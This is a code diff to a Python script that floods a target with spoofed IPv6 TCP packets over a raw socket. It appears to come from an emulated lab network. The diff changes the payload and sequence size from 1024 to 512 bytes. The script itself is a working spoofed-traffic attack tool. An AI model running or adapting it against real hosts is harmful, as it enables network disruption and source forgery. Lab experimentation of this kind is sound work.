@@ -20,13 +20,13 @@ os.system(
 
 print("Starting IPv6 single spoofed attack to %s:%d" % (target_ip, target_port))
 start_time = time.time()
-seq = 1024
+seq = 512
 
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
 s.bind(("h2-eth0", 0))
 
 eth_hdr = build_ethernet_header("00:04:00:00:02:01", "00:04:00:00:01:01", 0x86DD)
-payload = b"MALICIOUS_PAYLOAD".ljust(1024, b"X")
+payload = b"MALICIOUS_PAYLOAD".ljust(512, b"X")
 spoofed_src = "2001:db8:1::99"
 
 while time.time() - start_time < 60.0:
@@ -35,8 +35,7 @@ while time.time() - start_time < 60.0:
     )
     pkt = eth_hdr + ipv6_tcp_payload
     s.send(pkt)
-    seq += 1024
+    seq += 512
     time.sleep(0.001)
 
 s.close()
-time.sleep(5)
